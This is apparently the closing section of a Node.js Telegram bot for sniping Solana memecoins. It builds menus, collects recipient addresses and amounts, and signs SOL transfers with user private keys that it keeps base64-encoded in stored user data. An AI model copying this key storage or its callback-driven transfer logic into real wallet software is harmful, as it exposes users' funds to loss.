                { text: '🎯 ACTIVE TARGETS', callback_data: 'active_targets' }
            ],
            [
                { text: '📡 FORCE STATUS UPDATE', callback_data: 'force_status' },
                { text: '🔄 REFRESH COMMAND CENTER', callback_data: 'refresh_sniper' }
            ]
        ];
        
        try {
            await ctx.editMessageText(menuText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        } catch (error) {
            await ctx.reply(menuText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        }
    }

    start() {
        console.log('🦅 BirdEye Sniper Bot starting...');
        this.bot.launch();
        
        // Enable graceful stop
        process.once('SIGINT', () => this.bot.stop('SIGINT'));
        process.once('SIGTERM', () => this.bot.stop('SIGTERM'));
        
        console.log('✅ BirdEye Sniper Bot is running!');
        console.log('🎯 Ready for memecoin sniping operations...');
    }

    async handlePendingTransaction(ctx, text, pendingTx) {
        const messageId = ctx.message.message_id;
        
        try {
            switch (pendingTx.type) {
                case 'waiting_address':
                    await this.handleRecipientAddress(ctx, text, pendingTx);
                    break;
                case 'waiting_default_address':
                    await this.handleDefaultAddress(ctx, text, pendingTx);
                    break;
                case 'waiting_custom_amount':
                    await this.handleCustomAmount(ctx, text, pendingTx);
                    break;
            }
        } catch (error) {
            console.error('❌ Error handling pending transaction:', error);
            await ctx.reply('❌ Error processing your request. Please try again.');
        }
    }

    async handleRecipientAddress(ctx, address, pendingTx) {
        // Validate Solana address
        if (!this.isValidSolanaAddress(address)) {
            await ctx.reply('❌ Invalid target coordinates. Please provide a valid Solana address, Commander:');
            return;
        }

        const balance = await this.getWalletBalance(pendingTx.fromAddress);
        const message = 
            `✅ **TARGET COORDINATES CONFIRMED** ✅\n\n` +
            `💳 **SOURCE**: \`${pendingTx.fromAddress}\`\n` +
            `📮 **TARGET**: \`${address}\`\n` +
            `💰 **AVAILABLE ASSETS**: ${this.formatCurrency(balance)}\n\n` +
            `Please confirm target and select deployment amount, Commander:`;

        const sentMessage = await ctx.reply(message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ CONFIRM TARGET', callback_data: `confirm_recipient_${pendingTx.fromAddress}_${encodeURIComponent(address)}_${ctx.message.message_id}` }
                    ],
                    [
                        { text: '❌ ABORT MISSION', callback_data: `cancel_send_${pendingTx.originalMessageId}` }
                    ]
                ]
            }
        });

        // Update pending transaction
        this.pending_transactions.set(sentMessage.message_id, {
            ...pendingTx,
            type: 'waiting_confirmation',
            recipientAddress: address
        });

        // Clear old pending transaction
        for (const [key, tx] of this.pending_transactions.entries()) {
            if (tx.userId === pendingTx.userId && key !== sentMessage.message_id) {
                this.pending_transactions.delete(key);
            }
        }
    }

    async handleDefaultAddress(ctx, address, pendingTx) {
        if (!this.isValidSolanaAddress(address)) {
            await ctx.reply('❌ Invalid address format. Please provide a valid Solana address, Commander:');
            return;
        }

        this.users[pendingTx.userId].default_address = address;
        await this.saveUserData();

        await ctx.reply(
            `✅ **DEFAULT TARGET SET** ✅\n\n` +
            `🏠 **Default Target**: \`${address}\`\n\n` +
            `Assets will now be auto-deployed to this address after 30 minutes of inactivity, Commander.`,
            { parse_mode: 'Markdown' }
        );

        // Clear pending transaction
        this.pending_transactions.delete(ctx.message.message_id);
    }

    async handleCustomAmount(ctx, amountText, pendingTx) {
        const amount = parseFloat(amountText);
        if (isNaN(amount) || amount <= 0) {
            await ctx.reply('❌ Invalid amount. Please enter a valid number, Commander:');
            return;
        }

        const balance = await this.getWalletBalance(pendingTx.fromAddress);
        if (amount > balance) {
            await ctx.reply(`❌ Insufficient assets. Available: ${this.formatCurrency(balance)}, Commander.`);
            return;
        }

        await this.confirmTransaction(ctx, pendingTx.fromAddress, pendingTx.recipientAddress, amount, pendingTx.originalMessageId);
    }

    isValidSolanaAddress(address) {
        try {
            new PublicKey(address);
            return true;
        } catch (error) {
            return false;
        }
    }

    async confirmTransaction(ctx, fromAddress, toAddress, amount, originalMessageId) {
        const message = 
            `🔐 **FINAL CONFIRMATION REQUIRED** 🔐\n\n` +
            `💳 **SOURCE**: \`${fromAddress}\`\n` +
            `📮 **TARGET**: \`${toAddress}\`\n` +
            `💰 **DEPLOYMENT AMOUNT**: ${this.formatCurrency(amount)}\n` +
            `💵 **USD VALUE**: $${(amount * this.sol_price_usd).toFixed(2)}\n\n` +
            `⚠️ **WARNING**: This operation cannot be undone!\n\n` +
            `**Confirm deployment orders, Commander?**`;

        await ctx.reply(message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ EXECUTE DEPLOYMENT', callback_data: `execute_${fromAddress}_${encodeURIComponent(toAddress)}_${amount}_${originalMessageId}` },
                        { text: '❌ ABORT MISSION', callback_data: `cancel_send_${originalMessageId}` }
                    ]
                ]
            }
        });
    }

    // Add callback handler for recipient confirmation
    async handleRecipientConfirmation() {
        this.bot.action(/^confirm_recipient_(.+)_(.+)_(\d+)$/, async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) return;

            const [, fromAddress, encodedToAddress, messageId] = ctx.match;
            const toAddress = decodeURIComponent(encodedToAddress);
            
            const balance = await this.getWalletBalance(fromAddress);
            const message = 
                `💰 **SELECT DEPLOYMENT AMOUNT** 💰\n\n` +
                `💳 **SOURCE**: \`${fromAddress}\`\n` +
                `📮 **TARGET**: \`${toAddress}\`\n` +
                `💰 **AVAILABLE**: ${this.formatCurrency(balance)}\n\n` +
                `**Choose deployment percentage or custom amount, Commander:**`;

            await ctx.editMessageText(message, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '25%', callback_data: `amount_25_${fromAddress}_${messageId}` },
                            { text: '50%', callback_data: `amount_50_${fromAddress}_${messageId}` }
                        ],
                        [
                            { text: '75%', callback_data: `amount_75_${fromAddress}_${messageId}` },
                            { text: '💰 CUSTOM', callback_data: `amount_custom_${fromAddress}_${messageId}` }
                        ],
                        [
                            { text: '❌ ABORT MISSION', callback_data: `cancel_send_${messageId}` }
                        ]
                    ]
                }
            });

            // Store recipient address in pending transaction
            this.pending_transactions.set(parseInt(messageId), {
                type: 'amount_selection',
                fromAddress: fromAddress,
                recipientAddress: toAddress,
                userId: userId
            });
        });

        // Execute transaction handler
        this.bot.action(/^execute_(.+)_(.+)_(.+)_(\d+)$/, async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) return;

            const [, fromAddress, encodedToAddress, amount, originalMessageId] = ctx.match;
            const toAddress = decodeURIComponent(encodedToAddress);
            const sendAmount = parseFloat(amount);

            try {
                const userData = this.users[userId];
                if (!userData || !userData.private_key) {
                    await ctx.reply('❌ Wallet not found or private key missing, Commander.');
                    return;
                }

                const fromKeypair = Keypair.fromSecretKey(
                    Buffer.from(userData.private_key, 'base64')
                );

                await ctx.editMessageText('⏳ **EXECUTING DEPLOYMENT...**', { parse_mode: 'Markdown' });

                const signature = await this.sendTransaction(fromKeypair, toAddress, sendAmount);

                const successMessage = 
                    `✅ **DEPLOYMENT SUCCESSFUL** ✅\n\n` +
                    `💳 **SOURCE**: \`${fromAddress}\`\n` +
                    `📮 **TARGET**: \`${toAddress}\`\n` +
                    `💰 **ASSETS DEPLOYED**: ${this.formatCurrency(sendAmount)}\n` +
                    `🔗 **OPERATION ID**: \`${signature}\`\n` +
                    `⏰ **TIMESTAMP**: ${new Date().toLocaleString()}\n\n` +
                    `🔍 **VERIFY ON SOLSCAN**:\n` +
                    `https://solscan.io/tx/${signature}\n\n` +
                    `**MISSION ACCOMPLISHED, Commander!**`;

                await ctx.editMessageText(successMessage, { parse_mode: 'Markdown' });

                // Also send to group if configured
                if (this.groupId) {
                    try {
                        await this.bot.telegram.sendMessage(this.groupId, successMessage, {
                            parse_mode: 'Markdown'
                        });
                    } catch (groupError) {
                        console.error('❌ Error sending success message to group:', groupError);
                    }
                }

            } catch (error) {
                console.error('❌ Transaction failed:', error);
                await ctx.editMessageText(
                    `❌ **DEPLOYMENT FAILED** ❌\n\n` +
                    `**ERROR**: ${error.message}\n\n` +
                    `Please retry or contact tactical support, Commander.`,
                    { parse_mode: 'Markdown' }
                );
            }
        });
    }
}

// Start the bot
const bot = new BirdEyeSniperBot();
bot.start();
